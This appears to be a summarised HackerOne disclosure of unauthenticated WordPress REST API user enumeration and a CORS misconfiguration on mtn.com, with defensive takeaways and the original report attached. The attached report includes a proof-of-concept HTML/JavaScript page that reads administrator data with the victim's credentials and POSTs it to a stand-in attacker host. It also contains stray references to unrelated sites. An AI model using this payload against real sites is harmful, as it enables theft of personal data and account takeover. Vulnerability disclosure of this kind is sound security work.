# Unauthorized PII Access and Administrator Account Takeover via Unauthenticated WordPress REST API

## Metadata
- **Source:** HackerOne
- **Report:** 2450685 | https://hackerone.com/reports/2450685
- **Submitted:** 2024-04-06
- **Reporter:** h0w
- **Program:** MTN (mtn.com)
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Broken Authentication, Sensitive Data Exposure, CORS Misconfiguration, Insufficient Access Control, Information Disclosure
- **CVEs:** None
- **Category:** auth-crypto

## Summary
The WordPress REST API endpoint wp-json/wp/v2/users allows unauthenticated access to retrieve sensitive administrator information including email addresses and usernames. Combined with CORS misconfiguration (Access-Control-Allow-Credentials: true), attackers can exfiltrate PII through cross-origin requests when users visit attacker-controlled pages. This enables credential enumeration for password brute-force attacks and account takeover.

## Attack scenario
1. Attacker discovers wp-json/wp/v2/users/15 endpoint is accessible without authentication and returns administrator email and username
2. Attacker creates malicious HTML page with JavaScript that exploits CORS misconfiguration
3. Attacker tricks logged-in administrator into visiting attacker's page (via phishing, malicious ad, etc.)
4. JavaScript executes fetch request with withCredentials=true, leveraging victim's active session to retrieve user data from wp-json endpoint
5. Sensitive data (email, username) is automatically exfiltrated to attacker's server via POST request
6. Attacker uses obtained credentials to perform password brute-force or phishing attacks against wp-login.php

## Root cause
WordPress REST API endpoints lack proper authentication checks on user data endpoints, returning administrator information without requiring authentication. Default WordPress configuration exposes user enumeration through REST API. CORS policy permits credentials in cross-origin requests, enabling data exfiltration from authenticated user sessions.

## Attacker mindset
Exploiting common WordPress misconfigurations and default behaviors. Attacker leverages CORS policy trust to steal data from authenticated users without direct compromise. Focus on low-hanging fruit (REST API enumeration) to escalate to administrator account takeover through credential abuse.

## Defensive takeaways
- Implement authentication and authorization checks on all REST API endpoints, particularly those exposing user information
- Restrict REST API access to authenticated users only via authentication middleware
- Disable REST API user enumeration endpoints or require authentication for /wp-json/wp/v2/users routes
- Review and restrict CORS policy - remove Access-Control-Allow-Credentials: true unless absolutely necessary
- Implement proper origin validation for CORS requests
- Add capability checks to REST API endpoints (e.g., require 'list_users' capability)
- Monitor and log REST API access for suspicious enumeration patterns
- Implement Web Application Firewall (WAF) rules to block REST API enumeration attempts
- Use .htaccess rules to restrict access to sensitive REST API endpoints
- Apply WordPress security hardening: disable REST API via remove_action() if not needed
- Implement rate limiting on authentication endpoints to prevent brute-force attacks

## Variant hunting
Check other WordPress user enumeration endpoints: /wp-json/wp/v2/users without authentication
Test if higher user IDs expose other administrative accounts or sensitive users
Investigate other REST API endpoints for similar authentication bypass (posts, pages, taxonomies)
Review custom REST API endpoints for authentication gaps
Test CORS policy against other sensitive domains/subdomains
Check if WordPress version information leaks via REST API headers
Enumerate REST API capabilities available to unauthenticated users
Test for XML-RPC user enumeration methods as alternative attack vector
Review WordPress plugin REST endpoints for similar vulnerabilities
Test social engineering combined with CORS to steal session tokens or cookies

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application (REST API vulnerability)
- T1589 - Gather Victim Identity Information (PII enumeration)
- T1598 - Phishing (luring users to malicious page)
- T1566 - Phishing: Web Site (malicious HTML page delivery)
- T1111 - Multi-Factor Authentication Interception (credential theft)
- T1110 - Brute Force (password attacks using obtained credentials)
- T1021 - Remote Services (account takeover after credential compromise)

## Notes
Report demonstrates practical CORS + authentication bypass chain. The vulnerability is relatively straightforward but high-impact due to administrator account takeover potential. Root issue is lack of default authentication on REST API endpoints combined with misconfigured CORS. The proof-of-concept HTML effectively shows cross-origin data exfiltration. WordPress core issue compounded by lack of security hardening. Recommend: (1) Enable authentication requirement for REST API, (2) Fix CORS policy, (3) Implement WAF rules, (4) Monitor for exploitation attempts.

## Full report
<details><summary>Expand</summary>

## Summary:
This vulnerability is present in the `wp-json/wp/v2/users/15` file located in the wordpress directory endpoints. This flaw arises from insufficient restrictions placed on the list of post authors, which can be exploited by remote attackers to obtain sensitive information through wp/v2/users/15 requests attackers can obtain sensitive information in the form of email addresses (PII Leaks) and will be used in `wp-login` to send forget password or brute-force password requests.

**Descriptions:**
An cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page CORS misconfiguration is found on vanillaforums.com as `Access-Control-Allow-Credentials: true`.

**Platform(s) Affected: [website]**
https://www.mtn.com/wp-json/wp/v2/users/15

## Steps To Reproduce:
  1. Navigate visit hostname or directory on https:\/\/www.mtn.com\/wp-json\/wp\/v2\/users\/9
  1. Intercept request to `burp-suite` and you will see unauthenticated APIs `administrator_login` email address exposed

{F3171358}

  3. copy this scripts and save file as `.html` and open in our browsers 

```html
<!DOCTYPE html>
<html>
<body>
<center>
<h3>Steal administrator PII data!</h3>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://burpcollaborator-intruder-evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://www.mtn.com/wp-json/wp/v2/users/15", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
{F3171366}


## Supporting Material/References:
  * It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request.
  * It's also possible to create a rewrite rule on `.htaccess` (if the webserver it's Apache) to redirect any request that contain rest_route (eg.: "^.rest_route=/wp-json/wp/v2/users/15") to a Not Found (404) or a Default Page.

## Impact

1. Attacker get sensitive information PII Leaks (email adress)
 1. Attacker can brute-force the password use the valid administrator login
 1. CORS Misconfiguration, could lead to disclosure of sensitive information
 * Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
 * This website using Wordpress , so developer forget to enable authenticator in the APIs that can view information of admin user. By access to this link, attacker can get `username` and `email_address` and other information of user admin.

</details>

---
*Analysed by Claude on 2026-05-24*
